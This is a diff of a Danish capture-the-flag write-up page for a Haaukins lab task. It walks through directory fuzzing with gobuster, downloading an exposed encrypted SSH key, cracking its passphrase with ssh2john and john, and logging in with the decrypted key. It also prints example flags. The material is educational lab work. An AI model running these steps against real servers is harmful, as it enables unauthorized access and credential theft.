@@ -21,17 +21,37 @@
 <p class="subtitle">Directory listing → en krypteret nøgle → ssh2john → pivot ind.</p>
 <div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
-
+<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
+<h2>Find serveren</h2>
+<p>Opgavens hostname, fx <code>bustncrack.com</code>, er trods <code>.com</code>-endelsen en
+             Haaukins-intern lab-host — den findes ikke på det rigtige internet. Start lab'et, find dets IP, og
+             tilføj navnet til <code>/etc/hosts</code> (se <a href="kom-i-gang.html">Kom i gang</a> hvis du ikke
+             allerede har gjort det). Tjek derefter at webserveren svarer:</p>
+             <pre><code>curl -s -o /dev/null -w "%{http_code}\n" http://bustncrack.com/</code></pre>
 <h2>Bust — directory listing</h2>
-<p>Apache directory listing er slået til; fuzzing finder <code>/privacy/</code> med
-             <code>flag.txt</code> + <code>key.txt</code> (en krypteret RSA-privatnøgle).</p>
+<p>Apache directory listing er slået til, men stien er ikke linket fra forsiden — du skal selv
+             finde den. En hurtig content-discovery-scan:</p>
+             <pre><code>gobuster dir -u http://bustncrack.com/ -w /usr/share/wordlists/dirb/common.txt
+# -> /privacy/ (Status: 200) — Apache's directory-listing-side</code></pre>
+             <p>Åbn <code>http://bustncrack.com/privacy/</code> i browseren (eller <code>curl</code>): den lister
+             <code>flag.txt</code> og <code>key.txt</code> (en krypteret RSA-privatnøgle). Download begge:</p>
+             <pre><code>curl -sO http://bustncrack.com/privacy/flag.txt
+curl -sO http://bustncrack.com/privacy/key.txt
+cat flag.txt     # dette er Bust-flaget</code></pre>
 <h2>Crack — ssh2john + pivot</h2>
-<pre><code>ssh2john key.txt > key.hash
-john --format=SSH --wordlist=rockyou.txt key.hash     # -> ChangeMe
-openssl rsa -in key.txt -passin pass:ChangeMe -check   # bekræft
-# passphrasen er ikke flaget -> brug nøglen som pivot:
-openssl rsa -in key.txt -passin pass:ChangeMe -out dec_key
-ssh -i dec_key haxor@bustncrack.com ; cat /home/haxor/flag.txt</code></pre>
+<p><code>key.txt</code> er en adgangskode-beskyttet PEM-nøgle — den kan ikke bruges direkte til
+             <code>ssh</code> uden passphrasen. Knæk den offline med <code>ssh2john</code> + <code>john</code>
+             (hurtigere end at gætte den live mod SSH-serveren, og uden at risikere lockout):</p>
+             <pre><code>ssh2john key.txt > key.hash
+john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt key.hash
+john --show key.hash                                   # -> ChangeMe
+openssl rsa -in key.txt -passin pass:ChangeMe -check    # bekræft at passphrasen er rigtig</code></pre>
+             <p>Passphrasen i sig selv er <em>ikke</em> flaget — nøglen er et pivot-middel ind på en SSH-konto.
+             Afkryptér nøglen (fjern passphrase-kravet) og log ind med den:</p>
+             <pre><code>openssl rsa -in key.txt -passin pass:ChangeMe -out dec_key
+chmod 600 dec_key
+ssh -i dec_key haxor@bustncrack.com
+$ cat /home/haxor/flag.txt                              # Crack-flaget</code></pre>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <ul>
         <li>Bust: <span class="flag">HKN{wnW-Sc-owaen}</span></li>
